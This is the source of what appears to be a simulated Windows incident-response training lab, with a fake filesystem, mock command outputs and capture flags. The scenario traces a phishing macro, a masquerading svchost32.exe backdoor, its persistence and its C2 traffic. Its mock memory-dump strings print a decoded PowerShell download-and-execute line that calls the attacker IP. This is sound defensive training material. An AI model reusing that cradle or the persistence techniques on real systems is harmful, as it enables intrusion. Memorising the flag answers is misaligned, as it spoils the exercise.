                                <td style="padding:6px 10px; color:#888;">OneDrive Standalone Update Task</td>
                                <td style="padding:6px 10px;"><span style="color:#27ae60;">Ready</span></td>
                                <td style="padding:6px 10px; color:#888;">Hourly</td>
                                <td style="padding:6px 10px; font-family:monospace; font-size:0.7rem; color:#666;">C:\\Users\\jsmith\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe</td>
                                <td style="padding:6px 10px; color:#888;">2025-11-14</td>
                            </tr>
                            <tr style="background:#fff8f8; border-bottom:1px solid #f0c0c0;">
                                <td style="padding:6px 10px; font-weight:700; color:#e74c3c;">WindowsSystemCheck</td>
                                <td style="padding:6px 10px;"><span style="color:#e74c3c; font-weight:700;">Running</span></td>
                                <td style="padding:6px 10px; color:#c0392b;">At logon (jsmith), every 5 min</td>
                                <td style="padding:6px 10px; font-family:monospace; font-size:0.7rem; color:#c0392b; font-weight:700;">C:\\Users\\jsmith\\AppData\\Local\\Temp\\WindowsServices\\svchost32.exe</td>
                                <td style="padding:6px 10px; color:#e74c3c; font-weight:700;">2026-03-19</td>
                            </tr>
                            <tr style="border-bottom:1px solid #eee;">
                                <td style="padding:6px 10px; color:#888;">GoogleUpdateTaskMachineCore</td>
                                <td style="padding:6px 10px;"><span style="color:#27ae60;">Ready</span></td>
                                <td style="padding:6px 10px; color:#888;">Daily 08:00</td>
                                <td style="padding:6px 10px; font-family:monospace; font-size:0.7rem; color:#666;">C:\\Program Files\\Google\\Update\\GoogleUpdate.exe</td>
                                <td style="padding:6px 10px; color:#888;">2025-11-14</td>
                            </tr>
                        </tbody>
                    </table>

                    <div style="margin-top:14px; padding:10px 14px; background:#fff8f8; border:1px solid #fcc; border-radius:4px; font-size:0.75rem; color:#c0392b;">
                        <strong>Anomaly detected:</strong> Task "WindowsSystemCheck" created 2026-03-19 at 14:33 runs from a Temp directory — this is highly suspicious. Legitimate Windows tasks do not run from %TEMP%.
                    </div>
                `,
                formHandler: null
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM — CORP-WS-047 (Windows IR workstation)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        'C:\\': {
            type: 'dir',
            children: {
                'Users': {
                    type: 'dir',
                    children: {
                        'jsmith': {
                            type: 'dir',
                            children: {
                                'Desktop': {
                                    type: 'dir',
                                    children: {
                                        'budget_q1_2026.xlsx': {
                                            type: 'file',
                                            content: '[Excel spreadsheet — Q1 2026 budget data — legitimate file]'
                                        }
                                    }
                                },
                                'Downloads': {
                                    type: 'dir',
                                    children: {
                                        'invoice_march2026.xlsm': {
                                            type: 'file',
                                            content: '[Excel Macro-Enabled Workbook]\nFilename: invoice_march2026.xlsm\nSize: 284,672 bytes\nCreated: 2026-03-19 14:32:01\nModified: 2026-03-19 14:32:01\nSHA256: a3f8c21e9d4b7a56f082c3e1d9a47b3c2f1e8d5a9c6b4f2e7d1a3c8b5e9f2d4a\nMD5: a3f8c21e9d4b7a56f082c3e1d9a47b3c\n\n[Embedded VBA macro detected — AutoOpen sub executed on file open]\n[Content appears to be a spoofed invoice from "Meridian Suppliers LLC"]\n\n{{FLAG:dropper_hash}}'
                                        },
                                        'zoom_installer.exe': {
                                            type: 'file',
                                            content: '[Legitimate Zoom installer — 294,912 bytes — SHA256: 2c4d8f1a... (clean)]'
                                        }
                                    }
                                },
                                'AppData': {
                                    type: 'dir',
                                    children: {
                                        'Local': {
                                            type: 'dir',
                                            children: {
                                                'Temp': {
                                                    type: 'dir',
                                                    children: {
                                                        'WindowsServices': {
                                                            type: 'dir',
                                                            children: {
                                                                'svchost32.exe': {
                                                                    type: 'file',
                                                                    content: '[Win32 PE Executable — Backdoor.Win64.PhantomRAT.B]\nSize: 143,360 bytes\nCompiled: 2026-03-17 08:22:14 UTC\nSHA256: b7e4d92a1f3c8b5e9d2a6c4f1e7b3d8a5c9f2e4b1d6a8c3e7f9b2d5a1c4e8f3b\nMD5: b7e4d92a1f3c8b5e9d2a6c4f1e7b3d8a\n\n[Binary file — run Get-FileHash to obtain hash]\n[Use strings command to extract readable content]'
                                                                }
                                                            }
                                                        },
                                                        'email_headers.txt': {
                                                            type: 'file',
                                                            content: 'X-Mailer: The Bat! v9.3.4\nX-Originating-IP: 185.220.101.47\nDelivered-To: jsmith@meridiancorp.com\nReceived: from mail.meridian-suppliers.ru (185.220.101.47)\n   by mx.meridiancorp.com with ESMTP\n   id d9sm2847362pjl.19.2026.03.19.14.28.44\nFrom: "Accounts Payable" <ap@meridian-suppliers.ru>\nTo: jsmith@meridiancorp.com\nSubject: URGENT: Outstanding Invoice #INV-2026-0847 - Action Required\nDate: Wed, 19 Mar 2026 14:28:41 +0000\nMessage-ID: <20260319142841.47823.1@meridian-suppliers.ru>\n\n[Authentication Results]\nspf=fail (domain meridian-suppliers.ru does not designate 185.220.101.47 as permitted sender)\ndkim=none\ndmarc=fail\n\n[Body]\nDear Jessica,\n\nPlease find attached our outstanding invoice for March 2026.\nKindly process payment at your earliest convenience.\n\nBest regards,\nAccounts Payable\nMeridian Suppliers LLC\n\n[Attachment: invoice_march2026.xlsm]\n\n{{FLAG:attacker_email}}'
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        },
                        'IR-Analyst': {
                            type: 'dir',
                            children: {
                                'Desktop': {
                                    type: 'dir',
                                    children: {
                                        'case_notes.txt': {
                                            type: 'file',
                                            content: '=== INCIDENT CASE NOTES — INC-2026-0847 ===\nDate: 2026-03-19\nAnalyst: IR-Analyst\nEndpoint: CORP-WS-047\nUser: jsmith (Jessica Smith, Accounts Payable)\n\nINITIAL REPORT:\n- User reports computer "acting weird" at ~15:47\n- Intermittent slowness since approximately 14:30\n- Observed a command window flash briefly\n- No other users on workstation\n\nSOC PRE-TRIAGE:\n- Endpoint isolated from lateral network access at 15:48\n- Malware process still running\n- C2 channel appears active\n\nINVESTIGATION TASKS:\n[  ] Identify suspicious processes\n[  ] Check network connections\n[  ] Analyze memory dump at C:\\Triage\\svchost32.dmp\n[  ] Review event logs for initial access vector\n[  ] Check Prefetch and execution history\n[  ] Find and hash the dropper\n[  ] Remove persistence mechanisms\n[  ] Generate IOC report'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'Windows': {
                    type: 'dir',
                    children: {
                        'System32': {
                            type: 'dir',
                            children: {
                                'svchost.exe': {
                                    type: 'file',
                                    content: '[Legitimate Windows system file]\nMicrosoft Corporation — Host Process for Windows Services\nVersion: 10.0.19041.3996\nDigitally signed — Signature valid\nSHA256: 3781a92b17c4df18c54f8ebb88f9c15e... (clean)'
                                },
                                'winevt': {
                                    type: 'dir',
                                    children: {
                                        'Logs': {
                                            type: 'dir',
                                            children: {
                                                'Security.evtx': {
                                                    type: 'file',
                                                    content: '[Windows Security Event Log — binary format]\nUse: wevtutil qe Security /f:text /q:"*[System[EventID=4688]]"\nOr browse to: http://threatintel.local/event-viewer/security'
                                                },
                                                'System.evtx': {
                                                    type: 'file',
                                                    content: '[Windows System Event Log — binary format]\nUse: wevtutil qe System /f:text\nOr browse to: http://threatintel.local/event-viewer/system'
                                                }
                                            }
                                        }
                                    }
                                },
                                'Prefetch': {
                                    type: 'dir',
                                    children: {
                                        'SVCHOST32.EXE-4F3A8E21.pf': {
                                            type: 'file',
                                            content: 'Prefetch File: SVCHOST32.EXE-4F3A8E21.pf\nProcess: svchost32.exe\nRun Count: 1\nLast Run: 2026-03-19 14:32:11\nFirst Run: 2026-03-19 14:32:11\n\nLoaded DLLs (partial):\n  C:\\Users\\jsmith\\AppData\\Local\\Temp\\WindowsServices\\svchost32.exe\n  C:\\Windows\\System32\\ntdll.dll\n  C:\\Windows\\System32\\kernel32.dll\n  C:\\Windows\\System32\\ws2_32.dll\n  C:\\Windows\\System32\\winhttp.dll\n  C:\\Windows\\System32\\crypt32.dll\n  C:\\Windows\\System32\\advapi32.dll\n\nNote: Loading ws2_32.dll (networking) and winhttp.dll (HTTP) is\nnot expected for a process named like a Windows service.'
                                        },
                                        'EXCEL.EXE-2B4C7F9A.pf': {
                                            type: 'file',
                                            content: 'Prefetch File: EXCEL.EXE-2B4C7F9A.pf\nProcess: EXCEL.EXE\nRun Count: 47\nLast Run: 2026-03-19 14:32:01\nFile accessed: C:\\Users\\jsmith\\Downloads\\invoice_march2026.xlsm'
                                        },
                                        'POWERSHELL.EXE-B5D1A2C8.pf': {
                                            type: 'file',
                                            content: 'Prefetch File: POWERSHELL.EXE-B5D1A2C8.pf\nProcess: powershell.exe\nRun Count: 1 (on 2026-03-19)\nLast Run: 2026-03-19 14:32:08\nParent: cmd.exe (PID 8104)\nCommandLine evidence: -encodedCommand SQBFAFgAIAAoAE4AZQB3AC0AT...'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'Triage': {
                    type: 'dir',
                    children: {
                        'svchost32.dmp': {
                            type: 'file',
                            content: '[Process Memory Dump — svchost32.exe PID 3412]\nSize: 47,382,528 bytes (45.2 MB)\nCaptured: 2026-03-19 15:52:07\nCapture tool: ProcDump v11.0\n\nUse: strings C:\\Triage\\svchost32.dmp to extract readable strings\nUse: strings C:\\Triage\\svchost32.dmp | findstr http\nUse: strings C:\\Triage\\svchost32.dmp | findstr /R "^[A-Za-z0-9+/]\\{40,\\}"\n\n[Run the strings command to extract content from this dump]'
                        },
                        'README_IR.txt': {
                            type: 'file',
                            content: 'IR Triage Package — INC-2026-0847\n=====================================\nContents:\n  svchost32.dmp  - Process memory dump of PID 3412\n\nCapture commands used:\n  procdump -ma 3412 C:\\Triage\\svchost32.dmp\n\nNext steps:\n  1. Run strings against the dump to find C2 URLs and config data\n  2. Look for base64-encoded payloads and decode them\n  3. Correlate with network logs (see netstat output)\n  4. Hash the dropper: Get-FileHash C:\\Users\\jsmith\\Downloads\\invoice_march2026.xlsm -Algorithm SHA256'
                        }
                    }
                },
                'Program Files': {
                    type: 'dir',
                    children: {
                        'Wireshark': {
                            type: 'dir',
                            children: {
                                'Wireshark.exe': {
                                    type: 'file',
                                    content: '[Wireshark 4.2.3 — Network Protocol Analyzer — legitimate tool]'
                                }
                            }
                        }
                    }
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (Windows IR simulation)
    // ═══════════════════════════════════════════════════════

    commands: {

        // List processes — the primary discovery command
        'tasklist': function(args) {
            const fullCmd = args.join(' ');
            const verbose = fullCmd.includes('/v') || fullCmd.includes('/V');

            if (verbose) {
                return `
Image Name                     PID Session#  Mem Usage Status         User Name                                              CPU Time Window Title
========================= ======== ========= ========== ============== ====================================================== ======== ============
System Idle Process              0        0         24 K Unknown        NT AUTHORITY\\SYSTEM                                   0:00:00 N/A
System                           4        0      3,728 K Unknown        NT AUTHORITY\\SYSTEM                                   0:00:07 N/A
svchost.exe                    800        0     17,420 K Running        NT AUTHORITY\\SYSTEM                                   0:00:04 N/A
svchost.exe                    972        0     22,104 K Running        NT AUTHORITY\\NETWORK SERVICE                          0:00:01 N/A
svchost.exe                   1148        0     31,256 K Running        NT AUTHORITY\\LOCAL SERVICE                            0:00:02 N/A
lsass.exe                      664        0     14,892 K Running        NT AUTHORITY\\SYSTEM                                   0:00:00 N/A
explorer.exe                  2884        1    112,488 K Running        CORP\\jsmith                                           0:00:18 N/A
EXCEL.EXE                     4412        1    187,264 K Running        CORP\\jsmith                                           0:00:03 Microsoft Excel
svchost32.exe                 3412        1      8,940 K Running        CORP\\jsmith                                           0:02:47 N/A
powershell.exe                5824        1     61,320 K Running        CORP\\IR-Analyst                                       0:00:01 Windows PowerShell
chrome.exe                    6144        1    214,772 K Running        CORP\\jsmith                                           0:01:12 New Tab`;
            }

            return `
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0         24 K
System                           4 Services                   0      3,728 K
svchost.exe                    800 Services                   0     17,420 K
svchost.exe                    972 Services                   0     22,104 K
svchost.exe                   1148 Services                   0     31,256 K
lsass.exe                      664 Services                   0     14,892 K
explorer.exe                  2884 Console                    1    112,488 K
EXCEL.EXE                     4412 Console                    1    187,264 K
svchost32.exe                 3412 Console                    1      8,940 K
powershell.exe                5824 Console                    1     61,320 K
chrome.exe                    6144 Console                    1    214,772 K

[!] Note: svchost32.exe (PID 3412) running in user context (CORP\\jsmith), not SYSTEM.
[!] Legitimate svchost.exe is always run as SYSTEM/Network Service/Local Service.`;
        },

        // PowerShell Get-Process alias
        'Get-Process': function(args) {
            return D1Config.commands['get-process'](args);
        },
        'get-process': function(args) {
            const filter = args[0] || '';
            if (filter && filter.toLowerCase().includes('svchost32')) {
                return `
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    312      18    8940      9120       167.3   3412   1 svchost32

[!] Process svchost32 found running as CORP\\jsmith (user context)
[!] Parent process: powershell.exe (PID 9216)
[!] Path: C:\\Users\\jsmith\\AppData\\Local\\Temp\\WindowsServices\\svchost32.exe
[!] This is NOT the legitimate Windows svchost.exe (C:\\Windows\\System32\\svchost.exe)`;
            }
            return `
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    124       8    3728       4812         0.3      4   0 System
    482      22   17420      18304         4.2    800   0 svchost
    391      20   22104      23180         1.1    972   0 svchost
    612      34   31256      32740         2.4   1148   0 svchost
    201      15   14892      15820         0.2    664   0 lsass
   1847     112  112488     124360        18.4   2884   1 explorer
   2341     147  187264     201480         3.1   4412   1 EXCEL
    312      18    8940       9120       167.3   3412   1 svchost32
    891      67   61320      72480         1.2   5824   1 powershell
   3102     198  214772     238904        72.1   6144   1 chrome`;
        },

        // netstat — reveals C2 connection
        'netstat': function(args) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('-ano') || fullCmd.includes('-anob') || fullCmd.includes('-b') || fullCmd.includes('-a')) {
                return `
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       800
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       972
  TCP    10.0.1.47:52841        10.0.1.1:80            CLOSE_WAIT      6144
  TCP    10.0.1.47:52842        10.0.1.1:443           ESTABLISHED     6144
  TCP    10.0.1.47:52899        185.220.101.47:8443    ESTABLISHED     3412
  TCP    10.0.1.47:52900        185.220.101.47:8443    ESTABLISHED     3412
  UDP    0.0.0.0:5353           *:*                                    972

[!] PID 3412 (svchost32.exe) has ESTABLISHED connections to 185.220.101.47:8443
[!] 185.220.101.47 is a known Tor exit node / bulletproof hosting IP — likely C2`;
            }
            return `
Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    10.0.1.47:52899        185.220.101.47:8443    ESTABLISHED
  TCP    10.0.1.47:52900        185.220.101.47:8443    ESTABLISHED
  TCP    10.0.1.47:52841        10.0.1.1:80            CLOSE_WAIT

[!] Outbound ESTABLISHED connections to 185.220.101.47:8443 — investigate PID with -ano`;
        },

        // strings command — core memory analysis tool
        'strings': function(args, term, engine) {
            const fullCmd = args.join(' ');

            if (!fullCmd.toLowerCase().includes('svchost32.dmp')) {
                // Generic strings on other files
                const target = args.find(a => !a.startsWith('/') && !a.startsWith('|')) || '';
                if (target) return `strings: analyzing ${target}\n[Run against C:\\Triage\\svchost32.dmp for memory analysis]`;
                return 'Usage: strings <file>\nExample: strings C:\\Triage\\svchost32.dmp';
            }

            // Strings output from the memory dump
            const filterHttp = fullCmd.includes('findstr') && fullCmd.includes('http');
            const filterB64  = fullCmd.includes('findstr') && (fullCmd.includes('A-Za-z0-9') || fullCmd.includes('base64'));

            if (filterHttp) {
                D1Config._memDumpAnalyzed = true;
                if (engine) engine.advancePhase && engine.advancePhase('memory');
                return `http://185.220.101.47:8443/beacon
http://185.220.101.47:8443/cmd
http://185.220.101.47:8443/upload
http://185.220.101.47:8443/download
https://windows.microsoft.com/en-us/windows/end-support-help
http://checkip.amazonaws.com/

{{FLAG:c2_url}}`;
            }

            if (filterB64) {
                return `SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3ADoAOAA0ADQAMwAvAHAAYQB5AGwAbwBhAGQAIgApAA==
VwBpAG4AZABvAHcAcwBTAHkAcwB0AGUAbQBIAGUAbABwAGUAcgA=
c3ZjaG9zdDMyLmV4ZQ==
V2luZG93c1N5c3RlbUNoZWNr
[!] Decoded strings:
  1: IEX (New-Object Net.WebClient).DownloadString("http://185.220.101.47:8443/payload")
  2: WindowsSystemHelper
  3: svchost32.exe
  4: WindowsSystemCheck`;
            }

            // Full strings output (no filter)
            D1Config._memDumpAnalyzed = true;
            return `[strings output from C:\\Triage\\svchost32.dmp — 47 MB — showing relevant excerpts]

--- Embedded strings (truncated, 4+ chars) ---
MZ
!This program cannot be run in DOS mode.
kernel32.dll
ws2_32.dll
winhttp.dll
advapi32.dll
crypt32.dll
ntdll.dll
WinHttpOpen
WinHttpConnect
WinHttpSendRequest
CreateProcessA
RegSetValueExA
HKEY_CURRENT_USER
Software\\Microsoft\\Windows\\CurrentVersion\\Run
WindowsServiceHelper
WindowsSystemCheck
svchost32.exe
C:\\Users\\jsmith\\AppData\\Local\\Temp\\WindowsServices\\
http://185.220.101.47:8443/beacon
http://185.220.101.47:8443/cmd
http://185.220.101.47:8443/upload
SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8Ad
VwBpAG4AZABvAHcAcwBTAHkAcwB0AGUAbQBIAGUAbABwAGUAcgA=
c3ZjaG9zdDMyLmV4ZQ==
V2luZG93c1N5c3RlbUNoZWNr
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: */*
Content-Type: application/json
X-Session-ID: 4f3a8e21b9c7d5f2
185.220.101.47
8443
/beacon
/cmd
/upload
/download
/payload

[!] Tip: Use 'strings C:\\Triage\\svchost32.dmp | findstr http' to extract URLs
[!] Tip: Use 'strings C:\\Triage\\svchost32.dmp | findstr /R "^[A-Za-z0-9+/]\\{40,\\}"' for base64`;
        },

        // Get-FileHash — hash computation
        'Get-FileHash': function(args, term, engine) {
            return D1Config.commands['get-filehash'](args, term, engine);
        },
        'get-filehash': function(args, term, engine) {
            const fullCmd = args.join(' ');
            const algo = fullCmd.toLowerCase().includes('md5') ? 'MD5' : 'SHA256';

            if (fullCmd.toLowerCase().includes('invoice_march2026') || fullCmd.toLowerCase().includes('invoice_march')) {
                if (engine) engine.advancePhase && engine.advancePhase('artifacts');
                const hash = algo === 'MD5'
                    ? 'A3F8C21E9D4B7A56F082C3E1D9A47B3C'
                    : 'A3F8C21E9D4B7A56F082C3E1D9A47B3C2F1E8D5A9C6B4F2E7D1A3C8B5E9F2D4A';
                return `
Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
${algo.padEnd(15)} ${hash.padEnd(64)} C:\\Users\\jsmith\\Downloads\\invoice_march2026.xlsm

{{FLAG:dropper_hash}}`;
            }

            if (fullCmd.toLowerCase().includes('svchost32')) {
                const hash = algo === 'MD5'
                    ? 'B7E4D92A1F3C8B5E9D2A6C4F1E7B3D8A'
                    : 'B7E4D92A1F3C8B5E9D2A6C4F1E7B3D8A5C9F2E4B1D6A8C3E7F9B2D5A1C4E8F3B';
                return `
Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
${algo.padEnd(15)} ${hash.padEnd(64)} C:\\Users\\jsmith\\AppData\\Local\\Temp\\WindowsServices\\svchost32.exe`;
            }

            const path = args[0] || '';
            return `Get-FileHash : Cannot find path '${path}' because it does not exist.\nAt line:1 char:1\nUsage: Get-FileHash <path> -Algorithm SHA256`;
        },

        // schtasks — scheduled task management
        'schtasks': function(args, term, engine) {
            const fullCmd = args.join(' ').toLowerCase();

            // Query all tasks
            if (fullCmd.includes('/query') || fullCmd.includes('query')) {
                if (fullCmd.includes('list') || fullCmd.includes('/fo')) {
                    return `
Folder: \\
HostName:                             CORP-WS-047
TaskName:                             \\MicrosoftEdgeUpdateTaskMachine
Next Run Time:                        3/20/2026 9:00:00 AM
Status:                               Ready
Last Run Time:                        3/19/2026 9:00:00 AM
Last Result:                          0
Author:                               CORP\\Administrator
Run As User:                          SYSTEM

HostName:                             CORP-WS-047
TaskName:                             \\WindowsSystemCheck
Next Run Time:                        3/19/2026 4:00:00 PM
Status:                               Running
Last Run Time:                        3/19/2026 3:55:00 PM
Last Result:                          0
Author:                               CORP\\jsmith
Run As User:                          CORP\\jsmith
Task To Run:                          C:\\Users\\jsmith\\AppData\\Local\\Temp\\WindowsServices\\svchost32.exe
Comment:                              Windows System Health Check Service
Scheduled Task State:                 Enabled
Trigger:                              At log on of CORP\\jsmith
                                      Every 5 minutes indefinitely

HostName:                             CORP-WS-047
TaskName:                             \\GoogleUpdateTaskMachineCore
Next Run Time:                        3/20/2026 8:00:00 AM
Status:                               Ready
Last Run Time:                        3/19/2026 8:00:00 AM
Last Result:                          0
Author:                               CORP\\Administrator
Run As User:                          SYSTEM

[!] SUSPICIOUS: WindowsSystemCheck runs from %TEMP% as user jsmith — created today`;
                }
                return `
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
\\MicrosoftEdgeUpdateTaskMachine          3/20/2026 9:00:00 AM   Ready
\\WindowsSystemCheck                      3/19/2026 4:00:00 PM   Running
\\GoogleUpdateTaskMachineCore             3/20/2026 8:00:00 AM   Ready
\\OneDrive Standalone Update Task         3/19/2026 4:15:00 PM   Ready

[!] WindowsSystemCheck — SUSPICIOUS — runs svchost32.exe from Temp directory`;
            }

            // Delete task
            if (fullCmd.includes('/delete') || fullCmd.includes('delete')) {
                if (fullCmd.includes('windowssystemcheck') || fullCmd.includes('windowssystem')) {
                    D1Config._taskDeleted = true;
                    if (engine) engine.advancePhase && engine.advancePhase('containment');
                    return `SUCCESS: The scheduled task "WindowsSystemCheck" was successfully deleted.

[+] Persistence mechanism 1 removed.
[+] Task no longer appears in task list.
[!] Remember to also remove the registry run key:\n    reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsServiceHelper /f`;
                }
                return `ERROR: The system cannot find the task specified.\nUsage: schtasks /delete /tn "<taskname>" /f`;
            }

            return 'Usage: schtasks /query [/fo LIST] [/v]\n       schtasks /delete /tn "<taskname>" /f';
        },

        // reg — registry operations
        'reg': function(args, term, engine) {
            const fullCmd = args.join(' ').toLowerCase();

            // Query registry run key
            if (fullCmd.includes('query') && fullCmd.includes('run')) {
                return `
HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    OneDrive    REG_SZ    C:\\Users\\jsmith\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe /background
    WindowsServiceHelper    REG_SZ    C:\\Users\\jsmith\\AppData\\Local\\Temp\\WindowsServices\\svchost32.exe

[!] WindowsServiceHelper is a malicious run key — points to svchost32.exe in Temp directory
[!] To remove: reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsServiceHelper /f`;
            }

            // Delete run key
            if (fullCmd.includes('delete') && (fullCmd.includes('windowsservicehelper') || fullCmd.includes('windowsservice'))) {
                D1Config._regKeyRemoved = true;
                return `The operation completed successfully.

[+] Registry run key "WindowsServiceHelper" deleted.
[+] Persistence mechanism 2 removed.
[!] Both persistence mechanisms are now removed.
[!] Terminate the running process: taskkill /PID 3412 /F`;
            }

            if (fullCmd.includes('delete') && fullCmd.includes('run')) {
                return `ERROR: The system was unable to find the specified registry key or value.\nSpecify the exact value name: /v WindowsServiceHelper`;
            }

            return 'Usage: reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n       reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsServiceHelper /f';
        },

        // taskkill — terminate processes
        'taskkill': function(args) {
            const fullCmd = args.join(' ').toLowerCase();
            if (fullCmd.includes('3412') || fullCmd.includes('svchost32')) {
                return `SUCCESS: The process with PID 3412 has been terminated.
SUCCESS: The process "svchost32.exe" (PID 3412) has been terminated.

[+] Malicious process terminated.
[+] C2 connections closed.
[!] Verify with: netstat -ano | findstr 185.220.101.47`;
            }
            return `ERROR: The process "${args[0] || ''}" not found.\nUsage: taskkill /PID <pid> /F\n       taskkill /IM <imagename> /F`;
        },

        // netsh — firewall management
        'netsh': function(args, term, engine) {
            const fullCmd = args.join(' ').toLowerCase();
            if (fullCmd.includes('firewall') || fullCmd.includes('advfirewall')) {
                if (fullCmd.includes('add') && (fullCmd.includes('185.220.101.47') || fullCmd.includes('185.220'))) {
                    D1Config._firewallRuleAdded = true;
                    return `Ok.

[+] Outbound firewall rule added: Block C2 IP 185.220.101.47
[+] All future connections to 185.220.101.47 will be blocked.
[!] Rule name: Block_PhantomRAT_C2`;
                }
                if (fullCmd.includes('show') || fullCmd.includes('dump')) {
                    return `Firewall policy: BlockInbound, AllowOutbound
\nExisting outbound rules:
  Allow TCP any -> 10.0.1.0/24 (LAN)
  Allow TCP any -> any:80,443 (HTTP/HTTPS)
  Allow UDP any -> any:53 (DNS)
  ${D1Config._firewallRuleAdded ? '[+] Block TCP any -> 185.220.101.47 (C2 block — added by IR)' : ''}`;
                }
                return 'Usage: netsh advfirewall firewall add rule name="Block_C2" dir=out action=block remoteip=185.220.101.47';
            }
            return 'Usage: netsh advfirewall firewall add rule name="<name>" dir=out action=block remoteip=<ip>';
        },

        // wmic — process information
        'wmic': function(args) {
            const fullCmd = args.join(' ').toLowerCase();
            if (fullCmd.includes('process') && (fullCmd.includes('3412') || fullCmd.includes('svchost32'))) {
                return `CommandLine                                                                        ExecutablePath                                                                   ParentProcessId  ProcessId  Name
C:\\Users\\jsmith\\AppData\\Local\\Temp\\WindowsServices\\svchost32.exe                   C:\\Users\\jsmith\\AppData\\Local\\Temp\\WindowsServices\\svchost32.exe   9216             3412       svchost32.exe

[!] Parent PID 9216 = powershell.exe (dropped by macro)
[!] Path is in user Temp directory — NOT C:\\Windows\\System32\\`;
            }
            if (fullCmd.includes('process') && fullCmd.includes('list')) {
                return `Name                 ProcessId  ParentProcessId  ExecutablePath
System               4          0                N/A
lsass.exe            664        496              C:\\Windows\\System32\\lsass.exe
svchost.exe          800        496              C:\\Windows\\System32\\svchost.exe
explorer.exe         2884       2860             C:\\Windows\\explorer.exe
EXCEL.EXE            4412       2884             C:\\Program Files\\Microsoft Office\\Office16\\EXCEL.EXE
svchost32.exe        3412       9216             C:\\Users\\jsmith\\AppData\\Local\\Temp\\WindowsServices\\svchost32.exe
powershell.exe       5824       2884             C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`;
            }
            return 'Usage: wmic process list brief\n       wmic process where ProcessId=3412 get CommandLine,ExecutablePath,ParentProcessId';
        },

        // dir — directory listing
        'dir': function(args, term, engine) {
            const path = (args.find(a => !a.startsWith('/')) || 'C:\\Users\\IR-Analyst\\Desktop').replace(/\//g, '\\');

            if (path.toLowerCase().includes('downloads') || path.toLowerCase().includes('jsmith\\downloads')) {
                return `
 Directory of C:\\Users\\jsmith\\Downloads

03/19/2026  02:32 PM    <DIR>          .
03/19/2026  02:32 PM    <DIR>          ..
03/19/2026  02:32 PM           284,672 invoice_march2026.xlsm
11/14/2025  09:17 AM           294,912 zoom_installer.exe
               2 File(s)        579,584 bytes
               2 Dir(s)  412,847,104,000 bytes free

[!] invoice_march2026.xlsm was created at 14:32 today — matches infection time`;
            }

            if (path.toLowerCase().includes('temp\\windowsservices') || path.toLowerCase().includes('windowsservices')) {
                return `
 Directory of C:\\Users\\jsmith\\AppData\\Local\\Temp\\WindowsServices

03/19/2026  02:32 PM    <DIR>          .
03/19/2026  02:32 PM    <DIR>          ..
03/19/2026  02:32 PM           143,360 svchost32.exe
               1 File(s)        143,360 bytes
               1 Dir(s)  412,847,104,000 bytes free`;
            }

            if (path.toLowerCase().includes('triage') || path.toLowerCase() === 'c:\\triage') {
                return `
 Directory of C:\\Triage

03/19/2026  03:52 PM    <DIR>          .
03/19/2026  03:52 PM    <DIR>          ..
03/19/2026  03:52 PM        47,382,528 svchost32.dmp
03/19/2026  03:50 PM             1,024 README_IR.txt
               2 File(s)     47,383,552 bytes
               1 Dir(s)  412,847,104,000 bytes free`;
            }

            if (path.toLowerCase().includes('desktop') || path === '.' || !path) {
                return `
 Directory of C:\\Users\\IR-Analyst\\Desktop

03/19/2026  03:45 PM    <DIR>          .
03/19/2026  03:45 PM    <DIR>          ..
03/19/2026  03:45 PM             2,048 case_notes.txt
               1 File(s)          2,048 bytes
               1 Dir(s)  412,847,104,000 bytes free`;
            }

            if (path.toLowerCase().includes('prefetch')) {
                return `
 Directory of C:\\Windows\\System32\\Prefetch

 [Showing incident-relevant files only]
03/19/2026  02:32 PM            78,340 EXCEL.EXE-2B4C7F9A.pf
03/19/2026  02:32 PM            12,416 POWERSHELL.EXE-B5D1A2C8.pf
03/19/2026  02:32 PM             9,728 SVCHOST32.EXE-4F3A8E21.pf
11/14/2025  09:00 AM            82,944 CHROME.EXE-A1B2C3D4.pf
03/05/2026  10:22 AM            64,512 WINWORD.EXE-E5F6A7B8.pf
               [+] to read: type C:\\Windows\\System32\\Prefetch\\SVCHOST32.EXE-4F3A8E21.pf`;
            }

            return `
 Directory of ${path}

[DIR] or file not found. Try:
  dir C:\\Users\\jsmith\\Downloads
  dir C:\\Triage
  dir C:\\Windows\\System32\\Prefetch
